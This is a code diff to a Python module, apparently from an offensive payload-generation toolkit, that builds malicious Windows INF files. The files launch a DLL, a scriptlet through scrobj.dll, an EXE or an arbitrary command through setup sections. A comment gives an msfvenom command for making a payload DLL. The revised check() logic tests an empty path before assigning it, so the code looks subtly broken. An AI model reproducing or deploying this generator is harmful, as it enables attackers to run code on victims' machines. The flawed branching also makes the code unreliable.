@@ -2,7 +2,7 @@
 # encoding: utf-8
 
 import logging
-from modules.mp_generator import Generator
+from modules.payload_builder import PayloadBuilder
 from collections import OrderedDict
 from common.utils import randomAlpha
 
@@ -23,7 +23,7 @@ ServiceName="<<<SERVICE_NAME>>>"
 ShortSvcName="<<<SERVICE_NAME>>>"
 """
 
-class InfGenerator(Generator):
+class InfGenerator(PayloadBuilder):
     """
      Module used to generate malicious Windows Setup information (INF)  File
      
@@ -56,35 +56,53 @@ class InfGenerator(Generator):
      """
     
     def check(self):
+        self.targetPath = ""
+        dictKey = "Target path (.exe, .dll, .sct) or command line"
+        if not self.mpSession.htaMacro:
+            paramDict = OrderedDict([(dictKey,None)])      
+            self.fillInputParams(paramDict)
+            if str(self.targetPath).lower().endswith(".dll"):
+                self.targetPath = paramDict[dictKey]
+            elif str(self.targetPath).lower().endswith(".sct"):
+                self.targetPath = paramDict[dictKey]
+            elif str(self.targetPath).lower().endswith(".exe"):
+                self.targetPath = paramDict[dictKey]
+            else:
+                self.mpSession.dosCommand = paramDict[dictKey]
+        
+        
         return True
+        
         
     
     def generate(self):
-                
         logging.info(" [+] Generating %s file..." % self.outputFileType)
-        paramDict = OrderedDict([("Target_Path",None)])      
-        self.fillInputParams(paramDict)
-        
-        
         # Fill template
         infContent = INF_TEMPLATE
-        if str(paramDict["Target_Path"]).lower().endswith(".dll"):
-            logging.info("   [-] Target is DLL...")
-            # Ex to generate calc launching dll (OCX payload for 64bit PC:
-            # msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll
-            infContent = infContent.replace("<<<TARGET_PATH>>>", "%s" % paramDict["Target_Path"])
-            infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs") 
-        elif str(paramDict["Target_Path"]).lower().endswith(".sct"):
-            logging.info("   [-] Target is Scriptlet file...")
-            infContent = infContent.replace("<<<TARGET_PATH>>>", "%%11%%\\scrobj.dll,NI,%s" % paramDict["Target_Path"])
-            infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
-        elif str(paramDict["Target_Path"]).lower().endswith(".exe"):
-            logging.info("   [-] Target is exe file...")
-            infContent = infContent.replace("<<<TARGET_PATH>>>", paramDict["Target_Path"])
-            infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
+             
+        if not self.mpSession.dosCommand:
+
+            if str(self.targetPath).lower().endswith(".dll"):
+                logging.info("   [-] Target is DLL...")
+                # Ex to generate calc launching dll (OCX payload for 64bit PC:
+                # msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll
+                infContent = infContent.replace("<<<TARGET_PATH>>>", "%s" % self.targetPath)
+                infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs") 
+            elif str(self.targetPath).lower().endswith(".sct"):
+                logging.info("   [-] Target is Scriptlet file...")
+                infContent = infContent.replace("<<<TARGET_PATH>>>", "%%11%%\\scrobj.dll,NI,%s" % self.targetPath)
+                infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
+            elif str(self.targetPath).lower().endswith(".exe"):
+                logging.info("   [-] Target is exe file...")
+                infContent = infContent.replace("<<<TARGET_PATH>>>", self.targetPath)
+                infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
+            else:
+                logging.warn("   [!] Could not recognize extension, assuming executable file or command line.")
+                infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
+                infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
         else:
-            logging.warn("   [!] Could not recognize extension, assuming executable file or command line.")
-            infContent = infContent.replace("<<<TARGET_PATH>>>", paramDict["Target_Path"])
+            logging.warn("   [-] Target is command line.")
+            infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
             infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
             
         # Randomize mandatory info    
